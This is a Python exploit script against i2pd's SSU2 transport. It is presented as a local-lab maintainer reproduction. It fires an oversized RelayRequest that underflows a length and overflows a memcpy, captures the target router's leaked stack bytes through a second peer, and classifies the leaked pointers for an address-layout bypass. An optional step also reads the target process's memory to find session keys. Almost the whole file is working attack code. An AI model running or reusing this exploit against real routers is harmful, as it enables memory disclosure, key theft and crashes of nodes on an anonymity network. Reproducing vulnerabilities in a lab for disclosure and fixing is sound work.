#!/usr/bin/env python3
"""smoke2.py — stage-2: fire VULN-01 (RelayRequest underflow → memcpy overflow)
and capture the P2 SendData stack leak. LOCAL LAB ONLY (maintainer reproduction).

Flow: Alice+Charlie establish → Alice delivers big attack RI (gzip block, same
identity as handshake) → Alice fires oversized RelayRequest → Bob's
HandleRelayRequest overflows SSU2SentPacket → SendData sends stale stack
(P2 leak) to Charlie. We measure the leak and classify pointers using Bob's
/proc/<pid>/maps (lab-side calibration instrument only)."""
import sys, time, base64, struct, os
sys.path.insert(0, "/home/z/my-project/scripts")
from ssu2lib import *

EV = "/home/z/my-project/lab/ev"
RI_LEN = 2816          # attack RI size (tune with relay len to set leak size)
RELAY_LEN = 1420       # RelayRequest block content size (> 1408 → underflow)

def pad_entries(start_marker):
    """Controlled padding as valid mapping entries: pNN=<250B value>."""
    out = b""
    i = 0
    return out

def build_pad(total_pad_bytes):
    """Fill with mapping entries 'p<i>' = <246 bytes of offset-stamped data>."""
    out = b""
    off = 0
    i = 0
    while off < total_pad_bytes:
        room = total_pad_bytes - off
        vlen = min(246, room - 6)   # 1+2..3 key + '=' + 1 len + 1 ';'
        if vlen < 16: break
        val = bytearray()
        for j in range(vlen):
            if j % 16 == 0 and j + 8 <= vlen:
                val += b"OFFS" + struct.pack("<I", off + j)
                # continue below
                val = val[:len(val)] # no-op
            else:
                if len(val) % 16 < 8 and b"OFFS" not in val[-8:]:
                    val += bytes([0x41 + (i % 26)])
                else:
                    val += bytes([0x41 + (i % 26)])
        # simpler: periodic 16-byte marker rows
        val = bytearray()
        j = 0
        while j < vlen:
            if j % 16 == 0 and j + 8 <= vlen:
                val += b"RIPAD" + struct.pack("<HBB", i, j // 16, 0xA5)
                j += 8
            else:
                val += bytes([0x41 + ((i + j) % 26)])
                j += 1
            if len(val) >= vlen: break
        entry = bytes([1 + len(str(i))]) + ("p%d" % i).encode() + b"=" + \
                bytes([len(val)]) + bytes(val) + b";"
        out += entry
        off += len(entry)
        i += 1
    return out, off

def main():
    os.makedirs(EV, exist_ok=True)
    t0 = time.time()
    bob = bob_keys("/home/z/my-project/lab/bob-data/router.info")
    # find bob pid via pidfile
    bob_pid = int(open("/home/z/my-project/lab/bob-data/i2pd.pid").read().strip())
    log("bob", "pid=%d ident=%s.." % (bob_pid, bob["ident_hash"][:8].hex()))

    alice = NodeIdentity()
    charlie = NodeIdentity()

    def mk_ri(ident, ts, addr_pad=b""):
        return build_ri(ident, ts,
                        [("netId", "2"), ("caps", "R"), ("router.version", "2.61.0")],
                        [("host", EVIL_IP), ("port", str(ALICE_PORT)),
                         ("s", i2p_b64(ident.st_pub)),
                         ("i", i2p_b64(ident.ikey)),
                         ("v", "2")],
                        addr_pad=addr_pad)

    ri_c = mk_ri(charlie, int(time.time() * 1000))
    ri_a0 = mk_ri(alice, int(time.time() * 1000) + 10)

    # big attack RI: same identity, bigger ts, padded to RI_LEN
    pad, used = build_pad(RI_LEN - len(ri_a0))
    ri_big = mk_ri(alice, int(time.time() * 1000) + 20, addr_pad=pad)
    # pad length granularity may be off by a few; accept ±8
    log("ri", "small=%d big=%d (target %d, delta %+d)" %
        (len(ri_a0), len(ri_big), RI_LEN, len(ri_big) - RI_LEN))

    sa = Peer("alice", alice, ALICE_PORT, bob)
    sc = Peer("charlie", charlie, CHARLIE_PORT, bob)
    sc.handshake(ri_c, relay_tag_req=True)
    log("charlie", "established, tag=%08x" % sc.relay_tag)
    sa.handshake(ri_a0)
    log("alice", "established")

    # ISOLATION TEST: charlie sends a plain data packet first
    sc.send_data([blk_datetime(), blk_padding(8)])
    log("charlie", "plain data packet sent")
    time.sleep(0.5)
    # phase-2: deliver big RI via Alice's session (gzip RouterInfo block)
    n = sa.deliver_ri(ri_big)
    log("alice", "big RI delivered (pkt %d), waiting 0.3s" % n)
    time.sleep(0.3)
    # drain any acks
    sa.recv_data(timeout=0.5)

    # ---- CALIBRATION INSTRUMENT: read Bob's actual session keys from memory ----
    # (lab-side verification only; the attack itself uses network primitives)
    if os.environ.get("LAB_MEMSCAN"):
        try:
            maps = open("/proc/%d/maps" % bob_pid).read()
            needle = sa.k_recv          # ba (Bob->Alice) we computed
            found = []
            import re
            with open("/proc/%d/mem" % bob_pid, "rb", 0) as mem:
                for line in maps.splitlines():
                    # any writable region (thread arenas are anonymous mmaps)
                    m = re.match(r"([0-9a-f]+)-([0-9a-f]+) rw", line)
                    if not m: continue
                    if "[stack" in line or "/memfd" in line: continue
                    a, b = int(m.group(1), 16), int(m.group(2), 16)
                    mem.seek(a)
                    data = mem.read(b - a)
                    off = data.find(needle)
                    while off >= 0:
                        addr = a + off
                        # dump 128 bytes before and 64 after
                        mem.seek(max(0, addr - 128))
                        ctx = mem.read(128 + 32 + 64)
                        found.append((addr, ctx))
                        off = data.find(needle, off + 1)
            with open(EV + "/memscan.txt", "w") as f:
                f.write("needle(ba mine)=%s\n" % needle.hex())
                f.write("occurrences=%d\n" % len(found))
                for addr, ctx in found:
                    f.write("at %x:\n%s\n" % (addr, ctx.hex()))
                # also dump my ab/ba for comparison
                f.write("my ab(send)=%s hdr=%s\n" % (sa.k_send.hex(), sa.k_send_hdr.hex()))
                f.write("my ba(recv)=%s hdr=%s\n" % (sa.k_recv.hex(), sa.k_recv_hdr.hex()))
                f.write("ck_after_sc=%s\n" % open("/tmp/scdump2/ck_after_sc_alice.txt").read().strip()
                        if os.path.exists("/tmp/scdump2/ck_after_sc_alice.txt") else "")
                f.write("ck_after_static=%s\n" % open("/tmp/scdump2/ck_after_static_alice.txt").read().strip()
                        if os.path.exists("/tmp/scdump2/ck_after_static_alice.txt") else "")
            log("memscan", "%d occurrences, saved" % len(found))
        except Exception as e:
            log("memscan", "failed: %r" % e)

    # fire the underflow: oversized RelayRequest from Alice
    t_fire = time.time()
    sa.fire_relay_request(sc.relay_tag, nonce=0x41414141, content_len=RELAY_LEN)
    log("alice", "relay request fired (content %d B)" % RELAY_LEN)

    # Charlie listens: the smashed packet comes to session2 (Charlie)
    leak = None
    for _ in range(10):
        r = sc.recv_data(timeout=1.5)
        if r is None: continue
        if r[0] == "LEAK":
            leak = r[1]
            log("charlie", "*** LEAK PACKET: %d bytes ***" % len(leak))
            break
        elif r[0] == "OTHER":
            log("charlie", "other packet %d B (word0 mismatch)" % len(r[1]))
        else:
            log("charlie", "normal data pkt %d blocks=%s" %
                (r[0], [t for t, c in r[1]][:6]))
    if leak is None:
        log("RESULT", "NO LEAK CAPTURED")
        return 1

    with open(EV + "/p2_leak.bin", "wb") as f: f.write(leak)
    log("ev", "leak saved %d bytes" % len(leak))

    # save bob maps + log for classification (calibration instrument)
    maps = open("/proc/%d/maps" % bob_pid).read()
    with open(EV + "/bob_maps.txt", "w") as f: f.write(maps)
    ranges = {}
    for line in maps.splitlines():
        parts = line.split()
        if len(parts) >= 6 and "-" in parts[0] and parts[1].startswith("r"):
            a, b = parts[0].split("-")
            ranges.setdefault(parts[-1], []).append((int(a, 16), int(b, 16), parts[1]))
    def classify(v):
        for name, rs in ranges.items():
            for a, b, perm in rs:
                if a <= v < b:
                    return "%s%s" % (name[-40:], "+%#x" % (v - a))
        return None
    ptrs = []
    for off in range(0, len(leak) - 8, 8):
        v = struct.unpack("<Q", leak[off:off+8])[0]
        if v < 0x1000 or v > 0x7fffffffffff: continue
        c = classify(v)
        if c: ptrs.append((off, v, c))
    with open(EV + "/p2_leak_parsed.txt", "w") as f:
        f.write("leak_size=%d (payloadSize+16=%d expected riSize+5+len+35+16)\n" %
                (len(leak), len(leak)))
        for off, v, c in ptrs:
            f.write("  +%-5d %016x  %s\n" % (off, v, c))
    log("RESULT", "LEAK %d B, %d classified pointers (saved to %s)" %
        (len(leak), len(ptrs), EV))
    # is bob alive?
    time.sleep(0.5)
    alive = os.path.exists("/proc/%d" % bob_pid)
    log("bob", "alive after overflow: %s" % alive)
    return 0

if __name__ == "__main__":
    sys.exit(main())
